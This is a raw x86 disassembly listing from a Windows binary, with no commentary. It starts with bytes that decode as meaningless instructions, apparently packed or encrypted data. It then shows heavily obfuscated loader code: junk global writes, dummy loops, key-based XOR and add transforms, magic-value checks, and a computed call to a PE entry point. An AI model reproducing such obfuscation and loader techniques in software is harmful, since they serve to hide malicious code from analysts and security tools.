  40d665:	out    dx,eax
  40d666:	shl    BYTE PTR [eax],cl
  40d668:	cwde   
  40d669:	fcom   DWORD PTR [ecx-0x7b]
  40d66c:	scas   eax,DWORD PTR es:[edi]
  40d66d:	adc    dh,0xd1
  40d670:	push   ebx
  40d671:	xor    dl,0x89
  40d674:	shr    BYTE PTR [esi-0x6e],1
  40d677:	je     0x40d66a
  40d679:	jnp    0x40d6ce
  40d67b:	neg    BYTE PTR [ecx-0x5f04a86e]
  40d681:	cld    
  40d682:	or     ebx,ecx
  40d684:	fsubr  st,st(7)
  40d686:	jmp    0xa9db:0x84917e2a
  40d68d:	je     0x40d626
  40d68f:	lods   eax,DWORD PTR ds:[esi]
  40d690:	mov    ecx,0x56a10179
  40d695:	ins    DWORD PTR es:[edi],dx
  40d696:	push   cs
  40d697:	lds    esi,FWORD PTR [edi+0x497ab235]
  40d69d:	cmp    DWORD PTR [edi+0x1a77763f],ecx
  40d6a3:	mov    al,0x2f
  40d6a5:	fcmovnu st,st(6)
  40d6a7:	and    bl,BYTE PTR [esi]
  40d6a9:	or     bl,BYTE PTR [edi-0x19bd8310]
  40d6af:	add    al,0x9
  40d6b1:	call   0x9320e730
  40d6b6:	dec    ecx
  40d6b7:	mov    edx,0x160fed49
  40d6bc:	adc    ax,0x371a
  40d6c0:	and    bl,BYTE PTR [edi-0x15]
  40d6c3:	out    dx,al
  40d6c4:	cld    
  40d6c5:	sub    al,0xbf
  40d6c7:	out    dx,eax
  40d6c8:	xchg   esi,eax
  40d6c9:	call   0xee22:0xcfa894c3
  40d6d0:	mov    ebp,0x9e16284e
  40d6d5:	xlat   BYTE PTR ds:[ebx]
  40d6d6:	popf   
  40d6d7:	and    eax,0xb68383a3
  40d6dc:	dec    edx
  40d6dd:	inc    eax
  40d6de:	addr16 into 
  40d6e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d6e1:	mov    bh,0xad
  40d6e3:	jmp    0xb1fa:0x5ce5c63c
  40d6ea:	fiadd  DWORD PTR [ecx-0x48]
  40d6ed:	inc    eax
  40d6ee:	inc    ebx
  40d6ef:	dec    edx
  40d6f0:	jbe    0x40d6e8
  40d6f2:	xor    DWORD PTR ds:0xc02d7390,0x49
  40d6f9:	das    
  40d6fa:	sbb    BYTE PTR [edx],ah
  40d6fc:	pop    eax
  40d6fd:	aam    0xa
  40d6ff:	imul   eax,DWORD PTR [edi],0x31
  40d702:	fs pop esp
  40d704:	mov    ss,WORD PTR [edx]
  40d706:	loopne 0x40d734
  40d708:	xchg   DWORD PTR [edi+edi*8],edx
  40d70b:	jg     0x40d6f4
  40d70d:	pop    ds
  40d70e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d70f:	test   eax,0x975358b3
  40d714:	scas   eax,DWORD PTR es:[edi]
  40d715:	dec    esi
  40d716:	fisttp DWORD PTR [ebx]
  40d718:	inc    ebx
  40d719:	imul   esi,DWORD PTR [ebx-0x28af0c2a],0x5d56cbe0
  40d723:	adc    BYTE PTR [edx+0x6949ba39],cl
  40d729:	mov    cs,ebx
  40d72b:	in     al,0xa2
  40d72d:	sbb    edx,DWORD PTR [ecx-0x46dab4e1]
  40d733:	das    
  40d734:	jecxz  0x40d74a
  40d736:	sbb    al,0xec
  40d738:	out    dx,eax
  40d739:	mov    ebp,0xa1d74585
  40d73e:	scas   eax,DWORD PTR es:[edi]
  40d73f:	into   
  40d740:	ins    DWORD PTR es:[edi],dx
  40d741:	scas   eax,DWORD PTR es:[edi]
  40d742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d743:	or     al,0xa4
  40d745:	dec    esp
  40d746:	sub    al,0xec
  40d748:	add    BYTE PTR [edx-0x2e],ch
  40d74b:	and    eax,0x37d920b5
  40d750:	xor    edx,DWORD PTR [eax+0x33de78ea]
  40d756:	rep lods eax,DWORD PTR ds:[esi]
  40d758:	pop    ecx
  40d759:	test   DWORD PTR [eax+esi*1-0x16],edi
  40d75d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d75e:	xor    BYTE PTR [ebx+0x1d],bl
  40d761:	xchg   edi,eax
  40d762:	dec    eax
  40d763:	setb   BYTE PTR [ecx]
  40d766:	loopne 0x40d78c
  40d768:	imul   esp,DWORD PTR [ecx-0x52b7a061],0x1a408406
  40d772:	test   eax,0xf013844b
  40d777:	mov    al,0xd1
  40d779:	inc    edi
  40d77a:	cdq    
  40d77b:	imul   edi,DWORD PTR [eax-0x405de2b9],0xfa3570da
  40d785:	xchg   edi,eax
  40d786:	loope  0x40d7bd
  40d788:	inc    esp
  40d789:	mov    esp,0xa26a222f
  40d78e:	xchg   ecx,eax
  40d78f:	inc    eax
  40d790:	jmp    0x40d780
  40d792:	(bad)
  40d795:	(bad)  
  40d797:	dec    ebp
  40d798:	lds    ecx,FWORD PTR [ebp+0x7f453c62]
  40d79e:	ins    BYTE PTR es:[edi],dx
  40d79f:	imul   esp,DWORD PTR [ebp+0x28],0x9d8870a5
  40d7a6:	clc    
  40d7a7:	das    
  40d7a8:	dec    edi
  40d7a9:	pusha  
  40d7aa:	push   ebp
  40d7ab:	adc    edi,DWORD PTR cs:[edx+0x12b59863]
  40d7b2:	fcom   DWORD PTR [ebx-0x1faef928]
  40d7b8:	mov    ch,0x4f
  40d7ba:	sbb    al,0x91
  40d7bc:	test   BYTE PTR [edi],dl
  40d7be:	fst    QWORD PTR [ebx+0xb5f1c1f]
  40d7c4:	add    DWORD PTR [ecx+ebp*2],0x5b
  40d7c8:	cmp    al,0xee
  40d7ca:	mov    ebx,0xb15cb21b
  40d7cf:	push   eax
  40d7d0:	test   eax,0x4dc819d9
  40d7d5:	mov    edi,0xbc0418ce
  40d7da:	push   edi
  40d7db:	jp     0x40d7d0
  40d7dd:	jno    0x40d833
  40d7df:	pop    esi
  40d7e0:	cmp    edx,DWORD PTR [ebp*1+0x3027ab30]
  40d7e7:	mov    al,0x88
  40d7e9:	inc    esp
  40d7ea:	mov    eax,DWORD PTR [edx-0x7e]
  40d7ed:	neg    DWORD PTR [ecx]
  40d7ef:	mov    dl,0x77
  40d7f1:	xchg   edi,eax
  40d7f2:	in     eax,dx
  40d7f3:	dec    esi
  40d7f4:	or     eax,0xcae8cb86
  40d7f9:	js     0x40d7a3
  40d7fb:	bound  eax,QWORD PTR [ebx+ebx*1+0x573baca0]
  40d802:	mov    esp,0xc32cd9f0
  40d807:	hlt    
  40d808:	pop    eax
  40d809:	xlat   BYTE PTR ds:[ebx]
  40d80a:	mov    ebx,0xde846444
  40d80f:	push   edi
  40d810:	fs stos DWORD PTR es:[edi],eax
  40d812:	pop    edx
  40d813:	mov    cl,0xfc
  40d815:	iret   
  40d816:	push   ebx
  40d817:	jne    0x40d7aa
  40d819:	cmp    BYTE PTR [edx],ch
  40d81b:	loope  0x40d7f3
  40d81d:	fbstp  TBYTE PTR [edx+0x2c]
  40d820:	sub    al,0xb0
  40d822:	cmp    esp,0xffffff80
  40d825:	in     eax,dx
  40d826:	mov    bh,0xc3
  40d828:	jmp    0x6a3a008
  40d82d:	(bad)  
  40d82e:	cmp    BYTE PTR [ebx+0x5d9bcba0],dh
  40d834:	in     al,dx
  40d835:	mov    dh,0x98
  40d838:	(bad)  
  40d839:	adc    ebp,DWORD PTR [esi-0x43c03299]
  40d83f:	jae    0x40d868
  40d841:	leave  
  40d842:	ins    BYTE PTR es:[edi],dx
  40d843:	popa   
  40d844:	bnd jne 0x40d7f9
  40d847:	faddp  st(0),st
  40d849:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d84a:	sti    
  40d84b:	rcl    DWORD PTR [edx],0x5c
  40d84e:	fs pop es
  40d850:	aaa    
  40d851:	push   edi
  40d852:	dec    esp
  40d853:	or     eax,0x849a9a3d
  40d858:	sbb    al,0x9a
  40d85a:	inc    esi
  40d85b:	inc    ebx
  40d85c:	jns    0x40d7e9
  40d85e:	shl    BYTE PTR [ecx+0x40],1
  40d861:	(bad)  
  40d862:	pop    ecx
  40d863:	push   ebp
  40d864:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d865:	mov    ds:0x19b6f582,eax
  40d86a:	aas    
  40d86b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d86c:	mov    edi,esi
  40d86e:	rcr    ch,1
  40d870:	add    eax,0xf07d031c
  40d875:	mov    edx,DWORD PTR [ebp-0x20]
  40d878:	mov    ebx,DWORD PTR [ebp-0x8]
  40d87b:	xor    edx,eax
  40d87d:	add    edx,ecx
  40d87f:	imul   edx,ebx
  40d882:	cmp    edx,edi
  40d884:	jbe    0x40a7b9
  40d88a:	pop    ebx
  40d88b:	pop    edi
  40d88c:	leave  
  40d88d:	ret    0x8
  40d890:	push   ebp
  40d891:	mov    ebp,esp
  40d893:	sub    esp,0x70
  40d896:	or     DWORD PTR ds:0x42fde9,0x42e21c
  40d8a0:	push   0x41b2bc
  40d8a5:	sbb    DWORD PTR ds:0x42fe76,0x42fdf1
  40d8af:	call   DWORD PTR ds:0x42e597
  40d8b5:	and    DWORD PTR ds:0x42fdfd,0x42fe82
  40d8bf:	test   ax,ax
  40d8c2:	jne    0x40d8d9
  40d8c8:	xor    eax,eax
  40d8ca:	mov    DWORD PTR ds:0x42e234,0x1bc4
  40d8d4:	jmp    0x40e0cc
  40d8d9:	adc    DWORD PTR ds:0x42e224,0x42fde9
  40d8e3:	push   0x41b2d4
  40d8e8:	call   DWORD PTR ds:0x42e60f
  40d8ee:	sbb    DWORD PTR ds:0x42e7fb,0x42fe72
  40d8f8:	test   ax,ax
  40d8fb:	mov    DWORD PTR ds:0x42fdf5,0x74f8
  40d905:	je     0x40d8c8
  40d90b:	call   DWORD PTR ds:0x42e557
  40d911:	cdq    
  40d912:	mov    DWORD PTR ds:0x42fe05,0x1251
  40d91c:	cmp    eax,0x45767589
  40d921:	jne    0x40d98c
  40d927:	mov    DWORD PTR ds:0x42fe76,0x294f
  40d931:	cmp    edx,0x87676567
  40d937:	jne    0x40d98c
  40d93d:	push   0x0
  40d93f:	push   0x0
  40d941:	adc    DWORD PTR ds:0x42e224,0x42e7f7
  40d94b:	push   0x9879874
  40d950:	push   0x45
  40d952:	push   0x1
  40d954:	push   0x545
  40d959:	push   0x87686787
  40d95e:	xor    DWORD PTR ds:0x42fe6e,0x75b9
  40d968:	push   0x9879877
  40d96d:	or     DWORD PTR ds:0x42fded,0x42e218
  40d977:	call   DWORD PTR ds:0x42e59f
  40d97d:	mov    DWORD PTR ds:0x42e21c,0x1611
  40d987:	jmp    0x40e0cc
  40d98c:	push   0x41b2e0
  40d991:	call   DWORD PTR ds:0x42e48f
  40d997:	test   eax,eax
  40d999:	je     0x40d9cd
  40d99f:	sbb    DWORD PTR ds:0x42fe01,0x42e234
  40d9a9:	push   0x41b314
  40d9ae:	and    DWORD PTR ds:0x42fded,0x2b9d
  40d9b8:	call   DWORD PTR ds:0x42e3fb
  40d9be:	mov    DWORD PTR ds:0x42fe8a,0x47ee
  40d9c8:	jmp    0x40e0cc
  40d9cd:	push   ebx
  40d9ce:	mov    ebx,0xf89c8531
  40d9d3:	add    DWORD PTR ds:0x42e218,ebx
  40d9d9:	mov    DWORD PTR [ebp-0x8],ebx
  40d9dc:	and    DWORD PTR ds:0x42fdf5,0x0
  40d9e6:	mov    ecx,DWORD PTR ds:0x42fdf5
  40d9ec:	inc    ecx
  40d9ed:	mov    DWORD PTR ds:0x42fdf5,ecx
  40d9f3:	cmp    DWORD PTR ds:0x42fdf5,0xf
  40d9fa:	jne    0x40da20
  40da00:	push   0x1990
  40da05:	push   0x7f06
  40da0a:	push   0x857e
  40da0f:	push   DWORD PTR [ebp-0x28]
  40da12:	push   0x42e28d
  40da17:	push   DWORD PTR [ebp-0x10]
  40da1a:	call   DWORD PTR ds:0x42e64f
  40da20:	cmp    DWORD PTR ds:0x42fdf5,0xe
  40da27:	jne    0x40da3a
  40da2d:	mov    ecx,DWORD PTR ds:0x42fdf5
  40da33:	inc    ecx
  40da34:	mov    DWORD PTR ds:0x42fdf5,ecx
  40da3a:	cmp    DWORD PTR ds:0x42fdf5,0x1d
  40da41:	jb     0x40d9e6
  40da47:	add    DWORD PTR ds:0x42e803,0x406c
  40da51:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  40da58:	lea    eax,[ebp-0x18]
  40da5b:	adc    DWORD PTR ds:0x42e7f3,ecx
  40da61:	mov    DWORD PTR [ebp-0x14],eax
  40da64:	adc    DWORD PTR ds:0x42fdd1,0x42e21c
  40da6e:	lea    eax,[ebp-0x1c]
  40da71:	mov    DWORD PTR ds:0x42fe05,0x1a
  40da7b:	cmp    DWORD PTR ds:0x42fe05,0x0
  40da82:	je     0x40dbc3
  40da88:	cmp    DWORD PTR ds:0x42fe05,0x1c
  40da8f:	jne    0x40daa1
  40da95:	push   DWORD PTR [ebp-0x1c]
  40da98:	push   DWORD PTR [ebp-0x14]
  40da9b:	call   DWORD PTR ds:0x42e653
  40daa1:	xor    ecx,ecx
  40daa3:	add    ecx,DWORD PTR ds:0x42fe05
  40daa9:	dec    ecx
  40daaa:	mov    DWORD PTR ds:0x42fe05,ecx
  40dab0:	jmp    0x40da7b
  40dab5:	mov    DWORD PTR ds:0x42e807,0x1d
  40dabf:	cmp    DWORD PTR ds:0x42e807,0x0
  40dac6:	je     0x40dbc3
  40dacc:	cmp    DWORD PTR ds:0x42e807,0xf
  40dad3:	jne    0x40dae4
  40dad9:	push   0x1303
  40dade:	call   DWORD PTR ds:0x42e563
  40dae4:	cmp    DWORD PTR ds:0x42e807,0x10
  40daeb:	jne    0x40dafe
  40daf1:	mov    ecx,DWORD PTR ds:0x42e807
  40daf7:	dec    ecx
  40daf8:	mov    DWORD PTR ds:0x42e807,ecx
  40dafe:	mov    ecx,DWORD PTR ds:0x42e807
  40db04:	dec    ecx
  40db05:	mov    DWORD PTR ds:0x42e807,ecx
  40db0b:	jmp    0x40dabf
  40db10:	mov    DWORD PTR ds:0x42e7ff,0x14
  40db1a:	cmp    DWORD PTR ds:0x42e7ff,0x0
  40db21:	je     0x40dbc3
  40db27:	cmp    DWORD PTR ds:0x42e7ff,0x2
  40db2e:	jne    0x40db41
  40db34:	push   0x1
  40db36:	push   0x279d
  40db3b:	call   DWORD PTR ds:0x42e657
  40db41:	cmp    DWORD PTR ds:0x42e7ff,0x3
  40db48:	jne    0x40db5b
  40db4e:	mov    ecx,DWORD PTR ds:0x42e7ff
  40db54:	dec    ecx
  40db55:	mov    DWORD PTR ds:0x42e7ff,ecx
  40db5b:	mov    ecx,DWORD PTR ds:0x42e7ff
  40db61:	dec    ecx
  40db62:	mov    DWORD PTR ds:0x42e7ff,ecx
  40db68:	jmp    0x40db1a
  40db6d:	mov    DWORD PTR ds:0x42fe76,0x1a
  40db77:	cmp    DWORD PTR ds:0x42fe76,0x0
  40db7e:	je     0x40dbc3
  40db84:	cmp    DWORD PTR ds:0x42fe76,0x6
  40db8b:	jne    0x40db97
  40db91:	call   DWORD PTR ds:0x42e65b
  40db97:	cmp    DWORD PTR ds:0x42fe76,0x7
  40db9e:	jne    0x40dbb1
  40dba4:	mov    ecx,DWORD PTR ds:0x42fe76
  40dbaa:	dec    ecx
  40dbab:	mov    DWORD PTR ds:0x42fe76,ecx
  40dbb1:	mov    ecx,DWORD PTR ds:0x42fe76
  40dbb7:	dec    ecx
  40dbb8:	mov    DWORD PTR ds:0x42fe76,ecx
  40dbbe:	jmp    0x40db77
  40dbc3:	mov    DWORD PTR [ebp-0xc],eax
  40dbc6:	or     ecx,eax
  40dbc8:	mov    eax,ds:0x41b1a8
  40dbcd:	or     DWORD PTR ds:0x42e807,edx
  40dbd3:	mov    eax,DWORD PTR [eax+0x1c8]
  40dbd9:	or     DWORD PTR ds:0x42e813,edx
  40dbdf:	mov    eax,DWORD PTR [eax]
  40dbe1:	mov    ecx,DWORD PTR [ebp-0xc]
  40dbe4:	push   esi
  40dbe5:	mov    esi,0x7510855
  40dbea:	sub    DWORD PTR ds:0x42fe7e,0x662
  40dbf4:	xor    eax,esi
  40dbf6:	push   edi
  40dbf7:	and    DWORD PTR ds:0x42fde5,0x0
  40dc01:	jmp    0x40dc13
  40dc06:	mov    edi,DWORD PTR ds:0x42fde5
  40dc0c:	inc    edi
  40dc0d:	mov    DWORD PTR ds:0x42fde5,edi
  40dc13:	cmp    DWORD PTR ds:0x42fde5,0x1d
  40dc1a:	jae    0x40dc4a
  40dc20:	cmp    DWORD PTR ds:0x42fde5,0x2b
  40dc27:	jne    0x40dc45
  40dc2d:	push   0x3dd1
  40dc32:	push   DWORD PTR [ebp-0x24]
  40dc35:	push   0x2bbe
  40dc3a:	push   0x75d2
  40dc3f:	call   DWORD PTR ds:0x42e567
  40dc45:	jmp    0x40dc06
  40dc4a:	mov    edi,0x32729c
  40dc4f:	add    eax,edi
  40dc51:	mov    DWORD PTR [ecx],eax
  40dc53:	mov    DWORD PTR ds:0x42e228,edx
  40dc59:	mov    eax,ds:0x41b418
  40dc5e:	mov    DWORD PTR ds:0x42fe01,0x477b
  40dc68:	cmp    eax,0x23c13046
  40dc6d:	mov    eax,DWORD PTR [ebp-0x4]
  40dc70:	mov    DWORD PTR ds:0x42fe09,0x45bc
  40dc7a:	je     0x40dd06
  40dc80:	mov    DWORD PTR ds:0x42e7f7,0x1c
  40dc8a:	cmp    DWORD PTR ds:0x42e7f7,0x0
  40dc91:	je     0x40dcd6
  40dc97:	cmp    DWORD PTR ds:0x42e7f7,0xa
  40dc9e:	jne    0x40dcaa
  40dca4:	call   DWORD PTR ds:0x42e56b
  40dcaa:	cmp    DWORD PTR ds:0x42e7f7,0xb
  40dcb1:	jne    0x40dcc4
  40dcb7:	mov    ecx,DWORD PTR ds:0x42e7f7
  40dcbd:	dec    ecx
  40dcbe:	mov    DWORD PTR ds:0x42e7f7,ecx
  40dcc4:	mov    ecx,DWORD PTR ds:0x42e7f7
  40dcca:	dec    ecx
  40dccb:	mov    DWORD PTR ds:0x42e7f7,ecx
  40dcd1:	jmp    0x40dc8a
  40dcd6:	mov    ecx,DWORD PTR [ebp-0x8]
  40dcd9:	sbb    DWORD PTR ds:0x42fe82,0x42e22c
  40dce3:	xor    eax,esi
  40dce5:	and    DWORD PTR ds:0x42fe82,0x42e224
  40dcef:	add    eax,edi
  40dcf1:	imul   eax,ecx
  40dcf4:	mov    DWORD PTR [ebp-0x8],eax
  40dcf7:	mov    DWORD PTR ds:0x42fdd1,0x365a
  40dd01:	jmp    0x40ddd3
  40dd06:	sbb    DWORD PTR ds:0x42e218,edx
  40dd0c:	xor    eax,esi
  40dd0e:	add    eax,edi
  40dd10:	and    DWORD PTR ds:0x42fe72,0x0
  40dd1a:	jmp    0x40dd2c
  40dd1f:	mov    ecx,DWORD PTR ds:0x42fe72
  40dd25:	inc    ecx
  40dd26:	mov    DWORD PTR ds:0x42fe72,ecx
  40dd2c:	cmp    DWORD PTR ds:0x42fe72,0x12
  40dd33:	jae    0x40dd6e
  40dd39:	cmp    DWORD PTR ds:0x42fe72,0x6
  40dd40:	jne    0x40dd4f
  40dd46:	push   DWORD PTR [ebp-0x24]
  40dd49:	call   DWORD PTR ds:0x42e56f
  40dd4f:	cmp    DWORD PTR ds:0x42fe72,0x5
  40dd56:	jne    0x40dd69
  40dd5c:	mov    ecx,DWORD PTR ds:0x42fe72
  40dd62:	inc    ecx
  40dd63:	mov    DWORD PTR ds:0x42fe72,ecx
  40dd69:	jmp    0x40dd1f
  40dd6e:	mov    ds:0x41b2b8,eax
  40dd73:	mov    eax,DWORD PTR [ebp-0x8]
  40dd76:	or     DWORD PTR ds:0x42fe0d,edx
  40dd7c:	xor    eax,esi
  40dd7e:	sub    DWORD PTR ds:0x42e230,edx
  40dd84:	add    eax,edi
  40dd86:	mov    ds:0x41b418,eax
  40dd8b:	mov    eax,DWORD PTR [ebp-0x4]
  40dd8e:	mov    ecx,DWORD PTR ds:0x41b2b8
  40dd94:	xor    eax,esi
  40dd96:	add    eax,edi
  40dd98:	mov    DWORD PTR ds:0x42fe09,0x3e5c
  40dda2:	cmp    ecx,eax
  40dda4:	jne    0x40ddd3
  40ddaa:	sub    DWORD PTR ds:0x42fe86,0x42fdfd
  40ddb4:	push   DWORD PTR [ebp-0x4]
  40ddb7:	and    DWORD PTR ds:0x42e7f3,0x4c1c
  40ddc1:	push   DWORD PTR [ebp-0x8]
  40ddc4:	adc    DWORD PTR ds:0x42e7ff,0x42fe8a
  40ddce:	call   0x40e0d0
  40ddd3:	mov    eax,ds:0x41b1a8
  40ddd8:	sbb    edx,DWORD PTR ds:0x42e7eb
  40ddde:	mov    eax,DWORD PTR [eax+0x18c]
  40dde4:	and    DWORD PTR ds:0x42fde5,0x0
  40ddee:	mov    edx,DWORD PTR ds:0x42fde5
  40ddf4:	inc    edx
  40ddf5:	mov    DWORD PTR ds:0x42fde5,edx
  40ddfb:	cmp    DWORD PTR ds:0x42fde5,0x18
  40de02:	jne    0x40de18
  40de08:	push   0x42fe09
  40de0d:	push   0x42e36d
  40de12:	call   DWORD PTR ds:0x42e573
  40de18:	cmp    DWORD PTR ds:0x42fde5,0x13
  40de1f:	jb     0x40ddee
  40de25:	mov    ecx,DWORD PTR ds:0x42fe21
  40de2b:	mov    ecx,DWORD PTR [ecx]
  40de2d:	or     DWORD PTR ds:0x42fdfd,ecx
  40de33:	mov    eax,DWORD PTR [eax]
  40de35:	mov    DWORD PTR ds:0x42fdf5,0x11
  40de3f:	cmp    DWORD PTR ds:0x42fdf5,0x0
  40de46:	je     0x40de77
  40de4c:	cmp    DWORD PTR ds:0x42fdf5,0x19
  40de53:	jne    0x40de65
  40de59:	push   DWORD PTR [ebp-0xc]
  40de5c:	push   DWORD PTR [ebp-0x10]
  40de5f:	call   DWORD PTR ds:0x42e65f
  40de65:	mov    edx,DWORD PTR ds:0x42fdf5
  40de6b:	dec    edx
  40de6c:	mov    DWORD PTR ds:0x42fdf5,edx
  40de72:	jmp    0x40de3f
  40de77:	mov    DWORD PTR [ebp-0x20],eax
  40de7a:	mov    eax,0xf89c853d
  40de7f:	mov    DWORD PTR [ebp-0x24],eax
  40de82:	mov    DWORD PTR [ebp-0x24],eax
  40de85:	mov    DWORD PTR [ebp-0x24],eax
  40de88:	mov    DWORD PTR [ebp-0xc],ebx
  40de8b:	mov    DWORD PTR [ebp-0x24],eax
  40de8e:	mov    DWORD PTR [ebp-0x24],0xf89c8539
  40de95:	mov    ebx,DWORD PTR [ebp-0x8]
  40de98:	mov    ecx,DWORD PTR [ebp-0x4]
  40de9b:	mov    edx,DWORD PTR [ebp-0x4]
  40de9e:	xor    edx,esi
  40dea0:	xor    ecx,esi
  40dea2:	add    ecx,edx
  40dea4:	mov    edx,DWORD PTR [ebp-0x4]
  40dea7:	xor    ebx,esi
  40dea9:	xor    edx,esi
  40deab:	add    ebx,edi
  40dead:	lea    ecx,[ecx+edx*1+0x9757d4]
  40deb4:	cmp    ebx,ecx
  40deb6:	ja     0x40df17
  40debc:	mov    eax,DWORD PTR [ebp-0x4]
  40debf:	xor    eax,esi
  40dec1:	lea    eax,[eax+ebx*1+0x32729c]
  40dec8:	push   eax
  40dec9:	mov    eax,DWORD PTR [ebp-0xc]
  40decc:	xor    eax,esi
  40dece:	lea    eax,[ebp+eax*1+0x3272a4]
  40ded5:	push   eax
  40ded6:	mov    eax,ds:0x41b1a8
  40dedb:	push   DWORD PTR [eax+0x1bc]
  40dee1:	call   0x402976
  40dee6:	mov    eax,DWORD PTR [ebp-0x4]
  40dee9:	xor    eax,esi
  40deeb:	lea    ebx,[ebx+eax*1+0x32729c]
  40def2:	mov    eax,DWORD PTR [ebp-0x4]
  40def5:	mov    ecx,DWORD PTR [ebp-0x4]
  40def8:	xor    ecx,esi
  40defa:	xor    eax,esi
  40defc:	add    eax,ecx
  40defe:	mov    ecx,DWORD PTR [ebp-0x4]
  40df01:	xor    ecx,esi
  40df03:	lea    eax,[eax+ecx*1+0x9757d4]
  40df0a:	cmp    ebx,eax
  40df0c:	jbe    0x40debc
  40df12:	mov    eax,0xf89c853d
  40df17:	mov    ecx,DWORD PTR [ebp+0xc]
  40df1a:	mov    DWORD PTR ds:0x41b02c,ecx
  40df20:	mov    ecx,DWORD PTR [ebp+0x10]
  40df23:	mov    DWORD PTR ds:0x41b280,ecx
  40df29:	mov    ecx,DWORD PTR ds:0x41b02c
  40df2f:	mov    edx,DWORD PTR [ebp-0x14]
  40df32:	sub    ecx,edi
  40df34:	xor    ecx,esi
  40df36:	mov    DWORD PTR [edx],ecx
  40df38:	mov    ecx,DWORD PTR [ebp-0x18]
  40df3b:	cmp    ecx,0xf89c8530
  40df41:	je     0x40df9e
  40df47:	mov    ecx,DWORD PTR [ebp-0x8]
  40df4a:	mov    edx,DWORD PTR [ebp-0x1c]
  40df4d:	xor    ecx,esi
  40df4f:	add    ecx,edi
  40df51:	cmp    ecx,edx
  40df53:	je     0x40df9e
  40df59:	mov    eax,ds:0x41b1a8
  40df5e:	mov    eax,DWORD PTR [eax+0x194]
  40df64:	mov    ecx,DWORD PTR [eax]
  40df66:	mov    eax,DWORD PTR [ecx+0x3c]
  40df69:	push   DWORD PTR ds:0x41b280
  40df6f:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40df73:	push   DWORD PTR ds:0x41b02c
  40df79:	add    eax,ecx
  40df7b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df81:	mov    ecx,DWORD PTR [ecx+0x194]
  40df87:	push   DWORD PTR [ecx]
  40df89:	call   eax
  40df8b:	mov    ecx,DWORD PTR ds:0x41b1a8
  40df91:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40df97:	mov    DWORD PTR [ecx],eax
  40df99:	jmp    0x40e0ae
  40df9e:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfa1:	mov    edx,DWORD PTR [ebp-0x20]
  40dfa4:	xor    ecx,esi
  40dfa6:	add    ecx,edi
  40dfa8:	cmp    ecx,edx
  40dfaa:	jne    0x40e091
  40dfb0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfb3:	xor    ecx,esi
  40dfb5:	add    ecx,edi
  40dfb7:	mov    DWORD PTR ds:0x41b22c,ecx
  40dfbd:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfc0:	xor    ecx,esi
  40dfc2:	add    ecx,edi
  40dfc4:	mov    DWORD PTR ds:0x41b224,ecx
  40dfca:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfcd:	mov    DWORD PTR [ebp-0xc],ecx
  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
